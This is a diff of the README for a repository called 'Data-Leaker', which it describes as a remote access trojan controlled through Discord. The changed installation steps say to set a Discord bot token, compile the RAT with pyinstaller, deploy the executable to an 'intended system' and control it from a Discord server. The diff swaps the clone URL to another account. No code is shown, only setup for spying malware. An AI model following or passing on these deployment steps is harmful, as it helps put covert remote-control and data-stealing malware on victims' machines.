@@ -100,22 +100,19 @@ This tool offers a variety of commands to manage files, retrieve system informat
 ## Installation and Setup
 1. Clone the repository:
     ```bash
-    git clone <https://github.com/Awzum731/Data-Leaker>
+    git clone <https://github.com/Kraz74pq1/Data-Leaker>
     cd <repository-directory>
     ```
 
-2. Install the required dependencies:
-    ```bash
-    pip install -r requirements.txt
-    ```
+2. Install the required dependencies.
 
-3. Configure your Discord bot token in the source code or environment variables.
+3. Configure your Discord bot token in the source code.
 
-4. Run the bot:
-    ```bash
-    python main.py
-    ```
+4. Compile the RAT using pyinstaller.
 
+5. Deploy the compiled executable to your intended system.
+
+6. Control the RAT via your Discord server.
 ---
 
 ## Disclaimer
